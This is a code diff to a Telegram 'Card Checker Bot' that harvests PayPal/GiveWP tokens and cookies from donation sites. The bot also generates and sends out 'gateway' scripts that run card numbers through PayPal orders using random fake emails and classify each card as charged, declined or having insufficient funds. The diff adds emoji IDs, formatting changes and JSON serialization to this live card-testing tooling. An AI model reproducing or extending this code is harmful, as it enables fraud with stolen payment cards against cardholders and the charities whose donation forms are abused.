@@ -65,6 +65,21 @@ PREMIUM_EMOJI_IDS = {
     "🏦": "5332455502917949981",
     "⏱": "5382194935057372936",
     "💳": "5445353829304387411",
+    "📊": "6042162865360479795",
+    "🔗": "6041532556378562130",
+    "💬": "6041746966182247891",
+    "⏳": "6041672599882234564",
+    "📁": "6042005959231881060",
+    "🛡": "6042084768209370313",
+    "🔑": "6042162463380152543",
+    "🌐": "6042108525459734869",
+    "📝": "6042152698609352468",
+    "📤": "6042161612322291254",
+    "📩": "6042162121432784337",
+    "👑": "6042162624011321350",
+    "🍀": "6041727558413189702",
+    "🎯": "6042161356312354193",
+    "📦": "6042163063242596023",
 }
 
 def premium_emoji(text):
@@ -98,7 +113,6 @@ def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retrie
     """إرسال ملف بأمان مع التحقق من النوع"""
     for i in range(retries):
         try:
-            # تحويل dict إلى string إذا لزم
             if isinstance(file_path, dict):
                 if 'file_path' in file_path:
                     file_path = file_path['file_path']
@@ -108,15 +122,12 @@ def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retrie
                     print(f"❌ Cannot extract path from dict: {file_path}")
                     return None
             
-            # تأكد إنه string
             file_path = str(file_path)
             
-            # تحقق من وجود الملف
             if not os.path.exists(file_path):
                 print(f"❌ File not found: {file_path}")
                 return None
             
-            # إرسال الملف
             with open(file_path, 'rb') as f:
                 return bot.send_document(
                     chat_id=chat_id,
@@ -241,19 +252,19 @@ def start(message):
     username = message.from_user.username or "No Username"
 
     IU = premium_emoji(f'''⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
-- - - - - - - - - - - - - - - - - - - - - -
+━━━━━━━━━━━━━━━━━━━━
 👤 𝐍𝐚𝐦𝐞: {userr}
 📌 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
 🆔 𝐈𝐃: <code>{user_id}</code>
-- - - - - - - - - - - - - - - - - - - - - -
+━━━━━━━━━━━━━━━━━━━━
 💳 PayPal Gateway >> /paypal 
 📁 Mass Extract >> /mass
 📩 Send Feedback >> Button Below
-- - - - - - - - - - - - - - - - - - - - - -
+━━━━━━━━━━━━━━━━━━━━
 🤖 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
 💎 𝐃𝐞𝐯 𝐁𝐲: Wafa''')
     
-    FRA = types.InlineKeyboardMarkup(row_width=2)
+    FRA = types.InlineKeyboardMarkup(row_width=1)
     Yes22 = types.InlineKeyboardButton('📩 Submit Feedback to Owner', callback_data='yrr')
     FRA.add(Yes22)
     
@@ -309,8 +320,8 @@ def back_to_start(call):
     user_id = call.from_user.id
     userr = call.from_user.first_name
     username = call.from_user.username or "No Username"
-    IU = premium_emoji(f'''⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n- - - - - - - - - - - - - - - - - - - - - -\n👤 𝐍𝐚𝐦𝐞: {userr}\n📌 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n🆔 𝐈𝐃: <code>{user_id}</code>''')
-    FRA = types.InlineKeyboardMarkup(row_width=2)
+    IU = premium_emoji(f'''⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n━━━━━━━━━━━━━━━━━━━━\n👤 𝐍𝐚𝐦𝐞: {userr}\n📌 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n🆔 𝐈𝐃: <code>{user_id}</code>''')
+    FRA = types.InlineKeyboardMarkup(row_width=1)
     Yes22 = types.InlineKeyboardButton('📩 Submit Feedback to Owner', callback_data='yrr')
     FRA.add(Yes22)
     try:
@@ -908,9 +919,12 @@ def ali_al2(massege):
         # إنشاء ملف gateway
         file_name = str(f'gateway_{int(time.time())}.py')
         with open(file_name, "w", encoding="utf-8") as f:
-            f.write(f'''import requests, re, random, time, base64, uuid
+            # استخدم json.dumps للـ dict
+            form_data_str = json.dumps(paypal.form_data)
+            cookies_str = json.dumps(paypal.cookies)
+            
+            f.write(f'''import requests, re, random, time, base64, uuid, json
 from fake_useragent import UserAgent
-from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from datetime import datetime
 
@@ -925,9 +939,9 @@ class PayPal:
         self.client_id = "{paypal.client_id or ''}"
         self.access_token = "{paypal.access_token or ''}"
         self.client_token = "{paypal.client_token or ''}"
-        self.form_data = {paypal.form_data}
+        self.form_data = json.loads('{form_data_str}')
         self.ajax_url = "{paypal.ajax_url or ''}"
-        self.cookies = {paypal.cookies}
+        self.cookies = json.loads('{cookies_str}')
         self.url = "{paypal.url}"
         self.inurl = "{paypal.inurl}"
         self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
@@ -1009,28 +1023,21 @@ class PayPal:
     def _clean_response(self, text):
         if not text:
             return "DECLINED"
-        
         text_upper = text.upper()
         text_lower = text.lower()
-        
         if '<!DOCTYPE' in text_upper or '<html' in text_upper:
             return "DECLINED"
-        
         if 'true' in text_lower or 'charge 1' in text_lower or 'charged' in text_lower or 'success' in text_lower:
             if 'error' not in text_lower:
                 return "CHARGE 1.0"
-        
         if 'insufficient' in text_lower:
             return "INSUFFICIENT_FUNDS"
-        
         if 'order_not_approved' in text_lower:
             return "Payer cannot pay for this transaction."
-        
         if 'expired_card' in text_lower:
             return "EXPIRED_CARD"
         elif 'declined' in text_lower or 'error' in text_lower:
             return "DECLINED"
-        
         return text[:80]
 
     def _create_order(self):
@@ -1038,12 +1045,10 @@ class PayPal:
             order_id = self._create_order_givewp()
             if order_id:
                 return order_id
-        
         if self.access_token:
             order_id = self._create_order_direct()
             if order_id:
                 return order_id
-        
         return None
 
     def _create_order_givewp(self):
@@ -1115,7 +1120,6 @@ class PayPal:
             result = self._approve_order_givewp(order_id)
             if result:
                 return result
-        
         if self.access_token:
             try:
                 headers = {{
@@ -1131,7 +1135,6 @@ class PayPal:
                 return response
             except:
                 pass
-        
         return None
 
     def _approve_order_givewp(self, order_id):
@@ -1197,8 +1200,7 @@ if __name__ == '__main__':
                 print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                 time.sleep(13)''')
         
-        # ✅ استخدام str() للتأكد
-        safe_send_document(massege.chat.id, str(file_name), caption=premium_emoji(f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\n👑 Dev: @FAWZY30'''))
+        safe_send_document(massege.chat.id, file_name, caption=premium_emoji(f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\n👑 Dev: @FAWZY30'''))
         os.remove(file_name)
 
     except Exception as e:
@@ -1250,10 +1252,6 @@ def check_single_link(link):
                 'link': link,
                 'live': True,
                 'respons': result,
-                'id_form1': paypal.form_data.get('give-form-id-prefix', ''),
-                'id_form2': paypal.form_data.get('give-form-id', ''),
-                'nonec': paypal.form_data.get('give-form-hash', ''),
-                'au': paypal.client_token or paypal.access_token or '',
                 'client_id': paypal.client_id or '',
                 'access_token': paypal.access_token or '',
                 'client_token': paypal.client_token or '',
@@ -1370,10 +1368,12 @@ def process_mass_file(message):
                     processing_status[user_id]['current_respons'] = result['respons']
                     
                     try:
-                        # إنشاء كود gateway
-                        code = f'''import requests, re, random, time, base64, uuid
+                        # استخدم json.dumps للـ dict
+                        form_data_str = json.dumps(result.get('form_data', {}))
+                        cookies_str = json.dumps(result.get('cookies', {}))
+                        
+                        code = f'''import requests, re, random, time, base64, uuid, json
 from fake_useragent import UserAgent
-from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from datetime import datetime
 
@@ -1388,9 +1388,9 @@ class PayPal:
         self.client_id = "{result.get('client_id', '')}"
         self.access_token = "{result.get('access_token', '')}"
         self.client_token = "{result.get('client_token', '')}"
-        self.form_data = {result.get('form_data', {{}})}
+        self.form_data = json.loads('{form_data_str}')
         self.ajax_url = "{result.get('ajax_url', '')}"
-        self.cookies = {result.get('cookies', {{}})}
+        self.cookies = json.loads('{cookies_str}')
         self.url = "{result.get('url', '')}"
         self.inurl = "{result.get('inurl', '')}"
         self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
@@ -1403,13 +1403,10 @@ class PayPal:
             n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
             if "20" in yy:
                 yy = yy.split("20")[1]
-            
             expiry = f"20{{yy}}-{{mm}}"
             order_id = self._create_order()
-            
             if not order_id:
                 return "Create Order Failed"
-            
             auth_tokens = []
             if self.client_token:
                 auth_tokens.append(self.client_token)
@@ -1417,7 +1414,6 @@ class PayPal:
                 auth_tokens.append(self.access_token)
             if self.client_id:
                 auth_tokens.append(self.client_id)
-            
             confirm_json = {{}}
             for auth_token in auth_tokens:
                 he4 = {{
@@ -1452,7 +1448,6 @@ class PayPal:
                         break
                 except:
                     continue
-            
             if isinstance(confirm_json, dict):
                 confirm_str = str(confirm_json).upper()
                 if 'INSUFFICIENT_FUNDS' in confirm_str:
@@ -1461,10 +1456,8 @@ class PayPal:
                     return "EXPIRED_CARD"
                 if 'ORDER_NOT_APPROVED' in confirm_str:
                     return "Payer cannot pay for this transaction."
-            
             approve_res = self._approve_order(order_id)
             text = approve_res.text if approve_res else ''
-            
             return self._clean_response(text)
         except Exception as e:
             return f"Error: {{e}}"
@@ -1653,8 +1646,7 @@ if __name__ == '__main__':
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
                         
-                        # ✅ استخدام str() للتأكد
-                        safe_send_document(chat_id, str(file_name), caption=premium_emoji(f"""✅ <b>Live Gateway #{live_idx}</b>
+                        safe_send_document(chat_id, file_name, caption=premium_emoji(f"""✅ <b>Live Gateway #{live_idx}</b>
 ━━━━━━━━━━━━━━━━━━━━
 🔗 Link: <code>{result['link']}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1662,15 +1654,15 @@ if __name__ == '__main__':
 ━━━━━━━━━━━━━━━━━━━━
 👑 Dev: @FAWZY30"""))
                         os.remove(file_name)
-                        time.sleep(2)
+                        time.sleep(1)
                     except Exception as e:
                         print(f"Error sending file: {e}")
-                        print(traceback.format_exc())
+                        traceback.print_exc()
                 else:
                     processing_status[user_id]['dead'] += 1
                     processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
             
-            time.sleep(2)
+            time.sleep(1)
         
         with processing_status[user_id]['lock']:
             processing_status[user_id]['done'] = True
